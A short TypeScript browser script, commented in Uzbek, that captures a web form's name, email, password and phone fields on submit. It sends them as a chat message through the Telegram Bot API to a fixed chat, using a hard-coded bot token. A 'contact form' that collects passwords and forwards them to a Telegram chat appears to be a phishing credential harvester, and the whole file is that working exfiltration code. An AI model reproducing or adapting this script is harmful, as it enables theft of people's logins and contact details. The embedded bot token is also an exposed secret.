'use strict';

const BOT_TOKEN: string = '8765203206:AAGkiR2x8tYa0fT6pi7VCdIcrW9LYw1xlok';
const CHAT_ID: string = '6023504003';

// HTML elementlarini DOM'dan olish va turlarini belgilash
const form = document.querySelector('#contactForm') as HTMLFormElement | null;
const statusText = document.querySelector('#status') as HTMLElement | null;

if (form && statusText) {
  form.addEventListener('submit', function (e: SubmitEvent): void {
    e.preventDefault();

    // Input elementlarini olish va qiymatlarini o'qish
    const emailInput = document.getElementById('email') as HTMLInputElement | null;
    const passwordInput = document.getElementById('password') as HTMLInputElement | null;
    const nameInput = document.getElementById('name') as HTMLInputElement | null;
    const callInput = document.getElementById('number') as HTMLInputElement | null;

    const email = emailInput?.value || '';
    const password = passwordInput?.value || '';
    const name = nameInput?.value || '';
    const call = callInput?.value || '';

    const text: string = `
📝 Yangi forma xabari:
👨    ism:${name}
📧    email:${email}
🔑    parol:${password}
📞    telefon:${call}
    `;

    // Telegram API ga so'rov yuborish
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: text,
      }),
    })
      .then((res: Response) => {
        statusText.textContent = 'Xabar muvaffaqiyatli yuborildi!';
        form.reset();
      })
      .catch((err: Error) => {
        statusText.textContent = 'Xatolik yuz berdi!';
        console.error(err);
      });
  });
}
